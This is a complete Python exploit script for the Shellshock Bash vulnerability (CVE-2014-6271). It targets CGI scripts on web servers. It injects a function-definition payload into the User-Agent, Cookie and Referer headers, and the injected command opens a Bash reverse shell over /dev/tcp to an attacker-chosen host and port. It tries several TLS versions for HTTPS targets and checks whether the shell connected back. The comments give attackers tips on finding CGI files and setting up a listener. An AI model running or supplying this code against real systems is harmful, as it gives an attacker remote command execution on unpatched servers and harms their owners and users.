#!/usr/bin/python3
#########################################################################################
# Exploit Title : Bash Remote Code Execution through mod_cgi scripts on HTTP server.    #
# CVE: CVE-2014-6271 aka ShellShock                                                     #
# Author : b4keSn4ke                                                                    #
# Version: Bash < 4.3                                                                   #
# Tested on : Bash 3.2 , 4.2                                                            #
#########################################################################################
#
#
# This exploit will only work on web servers having a version of Bash < 4.3. 
# In some cases, if you are able to get a HTTP 200 code on your web browser
# by doing a GET request to the /cgi-bin/, you could just try to run the exploit against that directory.
#
# Otherwise if you have a 403 on the /cgi-bin/ directory, try to enumerates for files 
# within that directory with a good wordlist, searching for .sh or .cgi extensions.
#
# NOTE: Don't forget to setup your TCP listenner, otherwise the exploit might give you
# a false positive during the testRevShell call check

from os import error
from urllib import request
import urllib
import argparse
import ssl
import socket
import time

BANNER = """
*********************************************************************
*   ____  _          _ _     _                _                     *
*  / ___|| |__   ___| | |___| |__   ___   ___| | __  _ __  _   _    *
*  \___ \| '_ \ / _ \ | / __| '_ \ / _ \ / __| |/ / | '_ \| | | |   *
*   ___) | | | |  __/ | \__ \ | | | (_) | (__|   < _| |_) | |_| |   *
*  |____/|_| |_|\___|_|_|___/_| |_|\___/ \___|_|\_(_) .__/ \__, |   *
*                                                   |_|    |___/    *
*                                                                   *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+              *
*            |E|x|p|l|o|i|t| |b|y| |b|4|k|e|S|n|4|k|e|              *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+              *
*                                                                   *
*                                                                   *
*                  https://github.com/b4keSn4ke/                    *
*                                                                   *
*********************************************************************
\n
"""

TLS_VERSIONS = {
    "TLS Version 1.2": ssl.SSLContext(ssl.PROTOCOL_TLSv1_2),
    "TLS Version 1.1": ssl.SSLContext(ssl.PROTOCOL_TLSv1_1),
    "TLS Version 1.0": ssl.SSLContext(ssl.PROTOCOL_TLSv1),
}

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="Shellshock exploit by b4keSn4ke")
    parser.add_argument("LHOST", help="IP Address on which the reverse shell should connect back to")
    parser.add_argument("LPORT", help="Port on which the reverse shell should connect back to")
    parser.add_argument("TARGET_URL", help="URL to carry the exploit on")
    args = parser.parse_args()

    
    protocol = setProtocol(args.TARGET_URL)

    # Resolving Hostname to IP address if any supplied
    RHOST = socket.gethostbyname(str(args.TARGET_URL).split("/")[2].split(":")[0])

    try:
        RPORT = int(str(args.TARGET_URL).split("/")[2].split(":")[1])
    except:
        if protocol == "https":
            RPORT = 443
        elif protocol == "http":
            RPORT = 80

    host = (RHOST, RPORT)

    print("[+] Protocol detected: {0}".format(protocol.upper()))
    sendPayload(setPayload(args, RHOST), args, protocol, host)

# Setting Protocol to use to HTTP or HTTPS
def setProtocol(url):
    if url[0:5] == 'https':
        return 'https'
    else:
        return 'http'

def setPayload(args, RHOST):
    print("\n[+] Setting Payload ...")

    # Initializing Payload
    payload = '() { :; }; '
    reverse_shell = '/bin/bash -c /bin/bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(args.LHOST,args.LPORT)
    
    # Setting Request and Headers
    req = request.Request(args.TARGET_URL, method="GET")
    req.add_header("User-Agent", payload + reverse_shell)
    req.add_header("Cookie", payload + reverse_shell)
    req.add_header("Host", RHOST)
    req.add_header("Referer", payload + reverse_shell)
    req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.add_header("Accept-Language", "en-US,en;q=0.5")
    req.add_header("Accept-Encoding", "gzip, deflate")
    
    return req

def sendPayload(req, args, protocol, host):
    print("[+] Sending Payload to {0} ...".format(args.TARGET_URL))

    if protocol == 'http':  
        try:
            request.urlopen(req, timeout=5)
            time.sleep(1)
        except urllib.error.HTTPError as httpErr:
            if httpErr.code != 500:
                print("\n[-] {0} - Couldn't send payload to {1} .".format(httpErr, args.TARGET_URL))
                exit()
        except urllib.error.URLError as urlErr:
            print("\n[-] {0} - Couldn't send payload to {1} .".format(urlErr.reason, args.TARGET_URL))
            exit()
        except socket.timeout as sockErr:
            http_code = 500
            print('\n[-] Request: {0} received HTTP code {1}'.format(sockErr, str(http_code)))
        except error as err:
            print("[-] An error occured : {0}".format(err.strerror))
            exit()

        testRevShell(args, host)
                
    elif protocol == 'https':

        # Iterating over TLS Versions until request succeeds
        for tls_key, tls_value in TLS_VERSIONS.items():
            try:
                print("[+] Trying to send payload over SSL with {0} ...".format(tls_key))
                request.urlopen(req, context=tls_value, timeout=5)
                time.sleep(1)
            except urllib.error.HTTPError as httpErr:
                print("\n[-] {0} - Couldn't send payload to {1} .".format(httpErr, args.TARGET_URL))
                exit()
            except urllib.error.URLError as urlErr:
                if str(urlErr.reason) == "[SSL: WRONG_SSL_VERSION] wrong ssl version (_ssl.c:1123)":
                    print("[-] {0} with {1}".format(urlErr.reason, tls_key))
                else:
                    print("\n[-] {0} - Couldn't send payloads to {1} .".format(urlErr.reason, args.TARGET_URL))
                    exit()
            except socket.timeout as sockErr:
                http_code = 500
                print('\n[-] Request: {0} received HTTP code {1}'.format(sockErr, str(http_code)))
                break
            except error as err:
                print("[-] An error occured : {0}".format(err.strerror))
                exit()

        testRevShell(args, host)
  
def testRevShell(args, host):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Testing if the Callback address (IP, PORT) are busy
    # Might result in false positive if you haven't set up your listener
    try:
        s.connect((args.LHOST,int(args.LPORT)))
        s.close()
        print("\n[-] Couldn't create Reverse shell")
        exit()
    except:
        s.close()
        print("\n[+] Reverse shell from {0} connected to [{1}:{2}].".format(host[0], args.LHOST,args.LPORT))
        print("\n[+] Payload Sent successfully !")

if __name__ == '__main__':
    main()